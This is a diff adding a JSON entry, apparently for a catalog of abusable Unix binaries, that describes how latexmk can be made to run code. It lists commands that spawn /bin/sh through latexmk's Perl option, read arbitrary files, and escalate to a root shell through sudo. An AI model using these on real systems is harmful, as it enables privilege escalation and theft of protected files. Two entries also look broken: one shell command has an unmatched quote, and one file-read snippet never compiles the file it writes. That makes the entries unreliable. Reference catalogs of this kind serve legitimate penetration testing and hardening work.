@@ -1,0 +1,27 @@
+{
+  "description": "This allows to execute Perl code.",
+  "functions": {
+    "shell": [
+      {
+        "code": "latexmk -e 'exec \"/bin/sh\";'"
+      },
+      {
+        "code": "latexmk -latex='/bin/sh"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "latexmk -e 'open(X,\"[file]\");while(<X>){print $_;}exit'"
+      },
+      {
+        "description": "The read file will be part of the output.",
+        "code": "TF=$(mktemp)\necho '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{[file]}\\end{document}' >$TF\nstrings tmp.dvi\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo latexmk -e 'exec \"/bin/sh\";'"
+      }
+    ]
+  }
+}
